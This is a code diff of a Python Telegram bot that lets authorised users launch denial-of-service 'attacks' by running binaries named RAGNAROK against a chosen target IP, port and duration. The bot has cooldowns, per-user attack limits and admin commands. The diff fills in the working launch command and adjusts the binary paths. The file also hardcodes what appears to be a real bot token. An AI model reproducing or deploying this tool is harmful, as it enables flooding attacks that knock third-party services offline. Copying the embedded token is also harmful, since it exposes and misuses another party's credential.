@@ -5,8 +5,6 @@ import time
 import subprocess
 import threading
 
-from keep_alive import keep_alive
-keep_alive()
 # Insert your Telegram bot token here
 bot = telebot.TeleBot('8055632675:AAFP5nV0zAFvGtKy70oSAnG6pZQ0hDmBIZ4')
 
@@ -26,11 +24,11 @@ USER_FILE = "users.txt"
 
 # Cooldowns and binaries for each attack
 attack_cooldowns = {
-    'attack1': {'cooldown': 240, 'last_used': None, 'binary': 'RAGNAROK'},
-    'attack2': {'cooldown': 300, 'last_used': None, 'binary': 'RAGNAROK1'},
-    'attack3': {'cooldown': 280, 'last_used': None, 'binary': 'RAGNAROK2'},
-    'attack4': {'cooldown': 300, 'last_used': None, 'binary': 'RAGNAROK3'},
-    'attack5': {'cooldown': 340, 'last_used': None, 'binary': 'RAGNAROK4'}
+    'attack1': {'cooldown': 240, 'last_used': None, 'binary': './RAGNAROK'},
+    'attack2': {'cooldown': 300, 'last_used': None, 'binary': './RAGNAROK1'},
+    'attack3': {'cooldown': 280, 'last_used': None, 'binary': './RAGNAROK2'},
+    'attack4': {'cooldown': 300, 'last_used': None, 'binary': './RAGNAROK3'},
+    'attack5': {'cooldown': 340, 'last_used': None, 'binary': './RAGNAROK4'}
 }
 
 # Global variables
@@ -119,7 +117,7 @@ def handle_attack(message):
         return
 
     # Execute the attack
-    full_command = f"./{binary} <target_ip> <target_port> <duration>"
+    full_command = f"{binary} {target} {port} {time_duration} 900"
     try:
         bot.reply_to(
             message,
@@ -189,19 +187,6 @@ def reset_user(message):
     save_users()
     bot.reply_to(message, f"✅ **Attack limit reset for User ID:** `{user_id}`")
 
-# Command to check all cooldowns
-@bot.message_handler(commands=['attack_status'])
-def attack_status(message):
-    status = "📊 **Attack Cooldown Status:**\n\n"
-    now = datetime.datetime.now()
-    for cmd, data in attack_cooldowns.items():
-        if data['last_used'] and (now - data['last_used']).seconds < data['cooldown']:
-            remaining = data['cooldown'] - (now - data['last_used']).seconds
-            status += f"⏳ **/{cmd}:** Remaining `{remaining}/{data['cooldown']} seconds`\n"
-        else:
-            status += f"✅ **/{cmd}:** Ready to use.\n"
-    bot.reply_to(message, status)
-
 # Admin command: Set cooldown for a specific attack
 @bot.message_handler(commands=['setcooldown'])
 def set_cooldown(message):
@@ -252,4 +237,3 @@ while True:
     except Exception as e:
         print(e)
         time.sleep(15)
-        
